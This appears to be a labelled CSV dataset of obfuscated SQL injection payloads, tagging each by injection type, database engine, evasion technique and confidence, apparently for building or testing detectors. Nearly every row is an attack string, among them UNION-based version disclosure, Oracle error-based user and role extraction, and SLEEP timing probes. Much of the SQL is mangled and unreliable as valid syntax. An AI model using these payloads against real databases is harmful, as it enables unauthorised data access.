payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
select * from users where id \= (SELECT (SELECT (SELECT 0))) +$ . or 1 LIKE (SELECT 1) AND 'b' LIKE 'b' AND True AND True OR 0 OR False -- 0b0b1,boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SeLeCt:* FrOm-uSERs\WheRE:ID` lIkE ""5O0B2X0o0o5;*$ . UNiON'sELECT;NuLL,@@vErSIOn\-- 0X3fbBDf",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"SElECt * FRoM uSeRs WHEre Id like (SELECt (sELEct (SELECT 0o1))) Or 0o2 ; OR 'O' nOT lIKe 'O' AND True#""@ UniON,SElEcT VERSiOn ( ) ,vErsION ( ) -- 1F",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SElEct * FRom UsErS Where iD=3x4 +/ ([~\. !) ^}(seLEct (SELECT 8))(*/ Union SELect;NULL,@@VersIon Or ""wU5l""/**/ NOT LIKE ""wu5L""=oR FAlSe Or (sELECt (SELECT (SELECT 0))) AND True OR (SELECT 0) -- 1XH_C J",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"% OR &""'' anD (SELEct (seLect (SELECT (SELECT 3297)))) <> (SELeCt (seLect 0b110011011101))# like 'R X@Dg/R",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"SELECT * FrOM USeRS WhEre id LIKE 0b4 <@.. Or 0X1 =*0x0O1/**/ )oR[ FaLse aND 0X26A8 Not`LIke (SElECt (sElect_(SElECT 0x23ed))) or<""H>U"" NoT LIkE ""H>u"" AnD (sELeCt (SelEcT (SeLECT 2456))) NOT/*(CH */liKE.(SeLECt 0b1110600111311) or\fAlSE And tRue AnD tRuE Or/FALSE anD ""xy ""=""Xy "" OR False --]1",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"SELect * frOm usErs WHEre Id = (SELECT 1) OR (selEct (sElEcT 1)) aND ""o"" LIKe ""o"" ANd ""0""!=""0n""#""? = (SELECT 0x1) UnIoN SELEct (SElECT 1),VeRsiON ( ) -- 2c",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"selecT *?fRoM(usERs wheRE Id=5x9b0o1 uNiON Select (sELEcT 0b0B0o0o60)`\`,vErsIOn ( ]) oR 'y'='y_' anD trUe oR FaLSe`Or+""y""=""YY"" Or ';A' NOT lIKE ';A' --)2nd(cU+O Tf2",union_based,unknown,case_variation|function_alternative,0.7,rule,sqliv5_json,string_single_quote
"seLeCt * FRom USeRS WhERe ID='0b2'&<@._ uNion sElECT 0X0,VeRSIon )(/*(SeLect (Select (SeleCT 5X58))) (A8ecM)l[ F*/ ) aND ',p3' not lIKE ',P5x0b0O5""' OR FalsE or FalSe OR fAlse or 'Gs'{NoT LiKe 'GS' && TRue oR FalSE oR (sELEcT 0X9) oR<FalsE!And\True && "" ""="" "" OR 'UYy'<>'UYy' OR False#aNd 0o85624 NoT LIKe 0XB39 ---1'2n%t|a9&GvIi",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"selEct * FROm USerS wHErE,ID LIKE '1' Or \.<$`uNION selEct 0X2,@@VErSIoN oR 3X5o0 Or &""W""+ noT LIKE ""W"" or` (seLECt (SELecT (sEleCt (seLeCT (SELECT 3))))) -- 4X4'8]",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"ANd 4X0X0b15 || fALSE && TruE and (sELecT (SeLECt (selecT 1))) oR 0 AND True# = Utl_INADDR.gET_HoST_ADdrESS~/**/ ( ( selEct distinCT )(_ useRNaMe& ) from oR (SELECT (seLEcT/**/(SElEcT (SELecT (SELEcT (SElect 5)))))) Or ""Qh"" NOt lIKE ""Qh""#( SeLecT disTinct ( usErNAme ) , RowNuM As liMIt FRom sYs.ALL_USeRs ) WherE LImit LiKE 0X1 ) ) and 'I' liKe 'Ix8<Y56\W%;7 P",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,string_double_quote
&& /(SELect 6o9o0B0o0o4X3) ;likE utL_Inaddr.gEt_hOSt_aDDrEss ( ($))SeLECt?coUnT\.( DIStinct ( gRAnteD_RoLe ) )\/*a}y<E^c0o0x0b10L`Ylspko*/ /*F@y;ZME[UU*/FrOM dbA_ROlE_PriVs?WHeRE GrAntee) lIkE sys.LoGIn_UsER ) + ) ; && 'i' +: lIKe 'I,error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"{)(/! ;]OR{/*w.yj5yrfU*/ ; ""(:)'x'?LIKE 'X",unknown,unknown,comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"^SElecT * frOM uSErs.Where Id)= (sELeCt (seLECT (SELECT 1))) Union Select @ $$,verSIoN ( ] ) aND tRue || (SeleCt`(sELEct 5)) and`'jlPO1'/**/noT Like 'jlpO9>' -- 0x5*Qj",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"sElECT * FROm UsERs wheRE Id=(SeLECt (SeLeCT 4X4)) Or "" 1"" \OR 0o0x0=0O0B1 Or'FaLSE{oR ""I`8"":lIke ""I`8o"" Or^(SELECT (SELECT (SELECT 5597)))~LikE 0XDA0 Or ""8j@"" NOT.=}""4B100j@""]-- (SELECT?0x1) q",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"SELeCT * froM:uSERs wherE ID {liKe 0x8X7 oR (selECt+(SElECt (seleCT (SELECT 1)))) Or ""!"" noT LIkE ""!"" && '{ml'='{ML' OR FalsE AnD trUe#""$ UniON SeLEcT 'A',VErsion ( ""<) -- 0b121Z;6YY",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"sELECT * fRoM UsErs,wHEre iD = *2x1 OR ""%;"" OR (SeLECt (SELECT 7)) = 0x5 && 0o0O1 or ""JPk"" noT Like ""jpk"" or (SELECT 0) --+2w",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SElECT * FROM USerS WHere}Id =( '0' *1{UNIon SeLECt 5x3,baNnEr FRom V$VersIoN wHeRe Rownum LikE (selECT{(SELECT 6)) anD~'pq49' LIkE ;'Pq68' OR FAlSe OR "";x"" liKE "";X*"" Or ""<""=""<m"" oR 0X0 or (sELECt 6x3) oR fAlSE || fALse aND tRUE OR 0 -- 0O4o1'gC",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"SElect:* FrOM UserS WHeRe;Id = '3o0O0o1' OR \<$ uNion<sELEcT/**/(SELEcT (SEleCt (SeLECT 3x1))),@@VeRSION?Or 0b0o0x80e0O0[NoT=0b4b1000011101004 OR\fAlSE :OR ""MK"" nOt lIke ""MK""?OR;"",""/*Oh*/ LIKE+ "",7"" oR{FAlSE OR ""c/yc""<>""c/yc"" --]2'",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"selEct * FroM uSERS WhERE+iD = (SeLEct (SELECT 8)) Or /**/!<@ OR Or (sELeCt (SELECT 1))]and TrUE OR 4586 NOT LIKE (SELECT 4586)#(SELEct""(SELecT (seLeCt 0x7))) lIKe &0B110o0B602 and TrUE=or='X'$NOt likE 'X')or ""2V""=""9Vz"" ANd trUE anD trUe -- 0x0b0o1B>Lj.!H k""S",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"sElEct z&N* frOm uSERS whERE iD <LIke* 0x2*oR )( \+ ). LIKE 0B5 unioN sELect~(SEleCt 0O0B1X1),@@vERSIoN AnD trUe Or FalSe && < TRUe aNd,tRUe or fAlSe or FALse ANd (seleCT 4XE14)!=0Xe15 OR False OR '!hMS' NOT LIKE '!hMS' -- 0X3caw CS",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"?SeLECT * FroM USErs/*SqZk/*/wHeRe iD like (SELeCT (SelEct (sELecT (select (seLect (SelEct (SelEct 0))))))), <@. uniOn SeLECT VersION ({ <)\ ,veRsioN ( ) and ""17G]""<>""43g]w"" || 3O0O0o8O0 or 'v' lIkE 'vL' oR false or ""{TRm""!=""{trM"" --/*e)*/9",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.7,rule,sqliv5_json,string_double_quote
"SelECT * FROm USErs WhERe iD LIke '7' + ({;\.% ) uNIon seLecT 4O1o1,@@vErSION and tRUE OR (SELECT (SELECT (SELECT (SELECT (SELECT 0))))) or '-' nOT lIkE '-' -- 8'i",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"SELECt * from USERS;WHere id'= '1' + @ (selecT 0x2o1)! UNIon SelecT (SEleCt (sElECt (SelecT/**/0X5))),VERSiOn ( ) oR FaLsE Or ""=""vM"" NOt LiKe ""=""vm"" AnD ""y`""!=""y`e"" Or fAlse AND ""?""=""?"" AND "",c"" NOT LIKE "",cg"" OR ""&PU""=""&PUg"" --=0o6'nm'.+c",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"SELect * frOm_UsErs wHERe id/*A-|< y^)\nT:1o*/ = '0o5o2' unION SelECt ""[""_,VErsiON ( <)> ANd ""L"" nOt liKE ""lh"" and TRUe && (SELect (SELECT 1)) or (SELECt (SELECT 0)) anD TrUE -- 0b1x0o0b0o4'qrVeY%",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"\SeLEct * FrOM usErs/*(Z*/WHerE id LiKe ;4x8=or ""1;""=9O4 Or<(SeLEct (sELecT (SeLeCT 0x1))) = >aND ""x"" nOT like ""xE"" && 'E@e' noT lIkE 'e@Eq'>or ""\""!=""\"" Or FalSe or faLSE#0b6 -- (SELeCT$0X6)[]3G09C",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SELecT *@fRoM UsERS wHERE ID lIkE, '4'&oR \<\. UnIoN SelECt*0o0o4o0B0X5,@@veRsion oR (SeLEct 0O0o9)!oR FaLSe aND tRue OR false AND ""Fs"" NOT LIKE ""Fs;"" -- 0O7'28l<{b",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"SELeCt * fRom UsERs WherE ID LIKe (selECT (SELECT 1)) or "",?"" oR 1 lIkE\/**/(sELecT (SeLecT""0x1)) OR ""ZI7dq""/nOT LiKE ""zi8dQ""^and truE&-- 1",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SELect {v* FroM USErs WHerE ID== '1' Or (| (SEleCt (SELECT 1)) ) liKe 6x0X0x0b1#uniON SelecT 0X1,baNnER(fROm?V$VerSioN;wheRe ROWnUm liKe (seLeCt!2X0x5) Or (SelECt (SElECT (SELECT 0)))*or]2X3 oR ""6;"" LIKe ""8;j"" Or FALse OR|'t' != 'T' oR ;faLse -- 0x1'&uE=7Wh(AA",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"sELeCT * From USeRS wHErE id?=:(SElECt (SELeCT 0x3)) or 'U b' LikE 'u bg' OR False#union SElEct 0o8x1a#,BAnNER from V$VerSIoN wHERe RoWnUm*= 0o0O7x3 -- 7\u",union_based,oracle,case_variation|function_alternative,0.41,rule,sqliv5_json,string_single_quote
"<selEcT * fROm usErs wHeRe`iD ,= (sElect\(SeleCT (seLect 0))) or*""{%"" oR (SEleCT (SELEct 1x0b101)) lIKE [0o0O2 Or/ (SeLeCt 9) oR 0X1388=0x0b1BBd or ""tFU""<>""tFU"" aND (SElECt 0B1){Or ""3"" = ""3."" anD TruE aNd ""3""+LIKe ""3""||FalSe Or fALSE or fALSe -- 9B0B0O1clt\nEa$3",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"&& 6b0o3x6O0O7x0b2B8b2xB =?UTL_InAddr.gEt_hOsT_ADDresS ( ( > SelECT DiStInCt` ( uSERnaME ). FROM ( SELEcT DIStiNct ""( UserNamE= ) , ROwnUM As lIMiT From SyS.ALl_UserS [) wheRE LiMiT liKE (SeLeCt (SELECT (sELEct (SeLeCt 0o3o0o5X5)))) ): )] %&& 'I' like 'I",error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"SeLECT * froM userS wHerE iD = OR False#(SeleCt (selECt 4)) OR (sElECt (SELECT (SELECT 1))) or '0' NOT lIKe '8'#""{ uNiOn seLECt 'a',vErsIoN ( ; ) -- 0b1!",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SelEcT * FrOM USerS WhERE/*J8b )*/id ='(SelEcT/*:v(z0o3*/0B1) UnION SeleCt @^aND @,VERsIon (; )% `oR (SELECT 7127) LIkE 2X1BD8 aND (SeLeCt (sEleCT 6060))]like (SeLecT 8000) OR 4799 LIKe 1o0b1001011000090 Or fALse aND}(SELEct 1798) LIKE}(SELECT 1798) Or (SELECT 0) OR falSe oR^'U ' Not lIKe 'U ' or�lsE}AND 1 And tRuE oR FALse AND:TRuE oR FAlSe OR fALsE -- 0O3%G$Cd;o",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SELecT * FrOm usERs WherE iD*= (Select (SeLEct 6))!UnIon SeLect !<@,vERSION =( _)_/ And tRue OR ""^?"" noT LIke ""^?"" -- 0X3X8X0o7 WBaU",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"0B1""}+)_ AND (.?0X0x187c?= (sElEct>0O13642) ).[*0o0x52A0B0B1110 ANd/*N^; Or ?FalSE AnD 0xfaC != 0XFaD ||`fALse(ANd true aNd trUE Or FaLSE OR falSE anD (SeLeCt (SELeCT (seleCt (SELECT 1)))) Or False AND True#Qk&<NY*/ [(= ""CIyC""$LiKE ""cIYCVC&3T^^aM.",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o4', ( sELECT ^ (. case whEN }( ?0x6x24E9/ LIkE (sElEct (SELecT (SeLecT 0X2475))) ) ~ tHEN SleEp$%( (sELeCT 0X5) Or '?aBx[' NoT LIke '?Abx[' and truE or FaLSe && TrUe OR (SElECt (SELECT 2))# ) ~eLSE (sElecT 0X0B0o0O0x24E3)* ( &SeLeCT 0b0b13243011180011 fROM InForMaTIOn_scHeMa.chaRActer_sEtS ) end )? ) D];N",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B1'.+) &.WherE""0X1x8X0O0b5010000101000| = :(SeLecT (sELECT (seLECT?(SELeCT&(sELEct;(selecT (SELEcT (SElEct (sElECt}(SeLEcT 1x2675))))))))))$uNION]ALL SElEcT[NulL,NUlL,NULL,Null,NuLl,nULl,nULL,nULlAndtrUe""AND>(sElect 2x0x6x0B9),and}""&aKh"" nOT LiKe ""&AKha""= oR 0X0o0o0O7023 nOT lIke (seLeCT 0X0X0b12100000011)/*WbOmB*/or FaLSE.or'False#`GwBH(<5X8UOp",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"0b4X1' ) < ) ) OR eXp ( ~ ( /**/SelECt * From ( SELEcT CoNcAT ( 0X7171006A71, ( SEleCT ( ELt ( 0b9x184E lIKe 7x187e,(sELeCt (selecT (SeLECT (SelEcT (SeleCt (seleCt (SElECT (sElecT (SeLeCT (SELECT 1)))))))))) ) ) ) ,0x617a761a72,0X78 ) ) x )/*xBimr*/ .) AnD ( ( ( 'fBsi' lIkE 'FbsI",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1' oR{cHaR ( (SElECt (SeLEct (sEleCt (SElECT (SELECT 68)))))+ )_* Or /**/CHAr ( 0b0X5X0X6aD025 %){ Or /*(SELecT 6)?*/ChaR ( 0b0b0x0B4X61 ) Or cHaR ( {(SElECt 85) ) lIKE reGeXp_SUBStriNG ( Repeat ( RIgHt ( CHAr ]( (sELect 0B8010100401101), ) ,(SELeCT 0) )-/*m} a A;=LVg5wl;q)fda\aXZolo*xxTYQ5w:\Wv*/,(seLECt (sElECt (sElecT 5201002140))) ) ,null* ) anD.'Uwep' liKe 'UWep",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0b104' iN BOOLEaN mODE ) @ && (seLEct (selECT (SeleCt/**/0O0b1001001101111))) liKE""%[,( sEleCt CoUNT ( ,* ) FrOm SYsIbm.sySTabLES as t0O0b0b1,SySIBm.SYSTAbles aS T8x3,sYSIBm.sysTAbLeS aS t0o4 ), aNd=(SeLEct 4B0X0)^&& 'and' liKE '&&' OR ""R[A""=""R[AY"" aND truE && ""eeF$"" NoT LikE ""EEf$e"" OR faLsE and TRuE!OR (sELECT (SElECt (SeLeCT (SEleCt 0o0)))) Or false Or falsE OR ""2V<""=""2V<y"" or fALsE#Sv^d[(seLECT 6) F~",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"CALL regEXP_sUBsTRINg{ ( rePEaT ( LEFt ( CrypT_KeY ( cHAR ( 0b0b0o0b111b1050361 ){{ OR ; CHAr?^( (SeLECt 0X0x1X0o0B0B1101115B181011)& ) :;oR chaR ( 7B0O0x0b101x0o44: ):%,nUll ) [,(seLECT/(SeLecT 5B0x1));/):?,0B0X3DCd7B1010181111100 {) ,Null ) AnD ( -^ ("" ""PaWH""} Like ""pAWH",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0X0x1%' anD 0X1182 LIkE uTL_iNadDr.gET_hOSt_aDDReSS (/*TUs1X28yW8*)5B ""5khhL:enO7tGW,86pV~*/ CHR `( (SElEcT 0x0x71) |) Or CHR (. (sElEcT 0X9X71) ) oR |chR ( 0x70 ) Or |cHr $(' 9b10011100 ) ` oR Chr ( Or FalsE OR (seLEct\(SEleCt (selEcT (SELEcT (SELECT 0))))) And tRUe anD true ANd '\aNd TRue or fALSE aNd TrUe Or 0#' nOT ""LiKE '#u'#8x71& ) oR ( }SeLeCt ( CaSE WHeN ( (SeLeCt (SELEcT (sELeCt 0385))))\=.,8X2282 ) ,ThEN (SELeCT (sElEct (selecT (SELECT 8x1)))) ELse:(SELeCt}(seleCt (sElECT?(SeLeCT 0X9))))`EnD ) ( From DUAL) ), Or Chr ( (SElect (seLeCt (SeLEcT (SeleCt (SELEcT (selECT (SELeCt 113))))))) ) )Or!ChR ( 0O2x0b1191012~ ){ or CHR ( (sEleCT 0X76) ) oR Chr ( (SELECt-(SELeCT 0X7a)) ) oR'chr @(/ (seLEcT (sELECt 1x71)) ) ) 'aNd '%'='u9a9h",error_based,oracle,case_variation|inline_comment|function_alternative,0.51,rule,sqliv5_json,string_single_quote
"5b1""[where!0x0x29E LIKe` 0B0o0O0o9x99E"" AND 0Xa9c `LiKe ] (]$seleCt COUNt ( * &) FROm sySUSeRs>as syS7,SYSUseRS As sys9x5x0,SYsuSERs`As Sys0X0o0b0X6,sYsUsErS&AS SyS8,SYsUSers As sys3,sySuSErs=AS Sys6,SysuSeRs aS SYS7 ) OR$(sELECt (selECT (seLECt (SELECt (SElecT (SElEct (SELECT 0))))))) AnD tRUe AND 0x1b8D not lIke 0x1b9e Or fALSe OR '<~`' Like '<~`*' And (sElEct 0X3) and (SElect (sElEcT 0x4))]Or<FALSE oR ""n"" <> ""n""+or (SelECT (sElECt[(sELeCT (SeleCT$0x23BB))))=0O0x23B5 or faLsE OR/false ANd ""0O3""=""4"": Or 0X1eD3 NOt Like (SElEct 0x1eD3) oR 0X2568 NOT lIkE (SeleCt (SelecT (SElEcT (SElEcT (sElecT 0X206b))))) Or FALse or fAlSE and TRuE --X5",boolean_blind,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"0B1 [) < && CHaR^ ( -(sELeCT aNd+(seleCt (SElECt (SelEcT 0B0x0O1))):aND (SElEcT 5x0O1) oR FaLSe oR FaLSE or FaLSe Or fALsE aNd 0X0o13c!=(seLeCT (sElecT (SELeCt (sEleCT (SELECT 285))))) Or fALsE aNd TRuE oR faLse oR faLsE or ""+"" LIkE ""+<""#(sELEcT 0X6f)) ) ||cHaR: ({ 0X0o0B100D ) Or CHar ( 0X39 $) oR chAR ( (0b0B0x3B311010 ) LIke ReGexp_sUbsTrinG (* repEAt ( LEFt _( crypT_kEy ( cHAR }( 0x0x41 {)\ OR/cHar= ( (sELECT 0b0x48) ) ||/*DY*/chAR (| (sELecT (sELeCT-(SeLect[0X53))) )/=,NULl !) ,0b0X0 ) +,0x0O0x240F0b110101401100\ )>{,nulL <) AnD }(~:(sElEct/*(seLECt (SEleCT (seLECT (SeLEcT 0x4))))!G+aIp*/0x22E1)& like~ 8920i(WDVRuP1nU6in]",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"SElECt]cOunt%\() *, ) 'LIkE ""From?SYsiBm.sYStabLeS aS/*NT}*/T4o0o0O1x6X2b0O0O0O0b1,sYsiBm.SySTabLes/*~I0B0b0b1001101000101111000000010001011001001010101110110101000000110011""!tEzd*/aS$T0X0O0o5O0x1x3,sySIBm.SystABleS?aS/**/T3""And;. (/* */ 'nJNR'=LiKE]'njNr",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"5""oR 4X0o101B Like; ; ( {sELEcT coUnt (/**o<*/ *?.)_ FroM sYsUSERs""AS syS0o2,SYSuSErS<aS<sYs0O0B0x0B10,Sysusers/*(SELeCt (sELeCT=(SeLect (SElecT (SeleCt (sElECT*(sELecT (SELECT (SELECT 6)))))))))*/as sYs0x0b15,SysUSERs/**/as""sys4,SySuSerS AS*sys3,sYSuSErS=As^SyS6,sysUSERS As SyS8 ) ~oR 0XEF3)lIkE 0XeF3 And ; (sElECT 0X9)!or 'YB' lIKE 'Yb~' Or faLSE AND True#+ZCYc8ZO !d DKf:`Fe",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0X0o0b0B1""_ ) :}) uNIoN all=SeLecT NULl,NulL,nUlL,Null,nuLL,nUll,nUll,NUlL Or faLse or\(SEleCT 7o20706)=0x0b1800010F aND (sELECT (sELEcT (sElECT (SELECt (sELECt 0X2AF))))) noT liKe (sELect'644);or 0b0x0 oR|'}' NOT* LIKE '}' Or (sELEcT (selECt (seLECt (sELeCt (SELECT (SELECT 0x0)))))) and 0x1 OR False#",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0b0%'[ ) ); anD cHar (& (sELeCt 5b1101201) ) or ChaR} ( (SElEct~(SELecT (seLEct (SeLEcT 79)))) ) oR cHaR (% 0X0B101910 ) oR Char ( 0x5a ) =rEGexP_SUBstRIng ( rEpEAT ( rIgHT ( ChaR ( 0O0X0x0b0b11010101110 ) ,(SELect 0x0) )& ,(seLEct (sELeCT 0X12a05f200)) ) ,Null* ); oR FALSE Or faLse# or /*(SElecT 0x6))* GX<eF0y7] y `x=(SELECT 2):*""zH*/faLSE OR ""]""<>""]"" or 0b1190150104010=(seLect (SeLECT 6493))+--B,\q;z*rU]i.E{",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1' );: WHERe 0X1303 lIKE (seLEct 1x0B0X1106) rlike ( seLEcT [( CasE wHEn \ ( (sELECT:(SeLecT (SeLeCT/**/(selECT (sElEct 7699))))) liKe* (SElEct 0x1c0o0B1110101)/ ) tHen 7X9 ElsE`0X28<eNd ) _ ) )aND 6o0o3x23Ca/*,Ga:eROC* ivY*/nOt]LiKE (SELecT 0X22cb)And0B0X1 oR "";"" noT like "";""* OR ""0""=""3]"" Or (SELEcT (SeLecT 0X0)) oR ! faLSe Or (sELeCT 0) oR (SelECT 0) Or fALse aND TRUE AnD TRUE ANd 't E'='t e' oR FALSE aNd TRuE --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"0X1 ) WHeRE+(SELECT+7x8A0X0b1010150) `=$~(SeLEct (selECT/*&[*/0b0X5a60)) ANd ElT %(: (selEct (sElect (SeLeCt 0X46E)))] = (seleCt 0o0X0o0o21A4),SleeP }( (SeLEcT 0B6x6) ) )/*rkFlQ*/> AnD ""w<5"" NoT""liKe+""W<0b5O5z"" ?ANd 'w?' NOt LIkE 'w?3' or FalSE}or fALse#a\A:XgymQ;BIFT",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0o1"" :) ;AS pAai WhErE (SeLECT/0x1f99)|`lIKE 0O0xfF9 aND ((sElect 0xBbf)= [( seLeCT COUNt ( *@ )] FroM sYsIBm.sySTAbles As/*hi*/t0o0O0o0B1,sysIbm.sYstABLeS as t4,sySIbm.sySTAbLes as T0B101 ) AnD 8B0XD0b0X1E lIKE (SELeCt 0x0O0b1100110010011)/**/ Or_ (sEleCT 2x99b) Not.lIKE/**/0B0b0b110000101011101110011011001111101111110001110100111000010101011001101101100000110111011111011001111001000111101000111111 ANd[""3}L""=""3}L"" ~OR| FALSE{!OR (sElECt (sELecT 0X1Ab2))-Not LiKe (SelECT (sEleCt (seLecT 0X19Ea))) aNd '~Aw' nOt] Like '~AWW'( AnD/ (SELect 0X1) AnD 'b'='b' OR""0o0 aND ""}""=""}"" aND TRue && TruE AND (SELECT 1) --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"0X1' iN BoOlEaN MoDe*?) anD 0o0b1110120111191^ =/*0O0 or 'e' nOT likE 'E' And~(SELect (selECT^0x0o1)) or 0o0x26af!=(sElEct (SELecT (seLEct 0x0b11010af))) aND. 'Dhl *' NOT lIkE 'DhL *)' OR (sElEct (seLECT 0)) oR fAlSe#)DUE*/ | (^ selECt;COUNT ( * `) .frOm SYsIBm.SYSTabLeS aS/*;1;/*/T4,sYsibM.sYsTAbLES AS t2,sySibm.SYSTabLES aS]t3 ) and+""Bt0O0X0o10O"")NOt LIKE ""bT8oQ"" and trUEaND(SeLEcT (sElECt (selEcT (sELeCT (SeleCT 0B0x1)))))/OR FAlSE -- <W~si",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"cAll REgEXP_sUbsTRiNg ( RePeat *(/*kJL=U !;*8l*/ rIgHT ( chAr`|(:}0B101XE1X4c ) ?,0o2o0B0. ) ,(SELeCt 7b2x4X1dcD3x0o0o4E7) )(;,NULL> )] and :!( ?( [""eEVK"" lIkE ""eeVK",unknown,unknown,case_variation|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
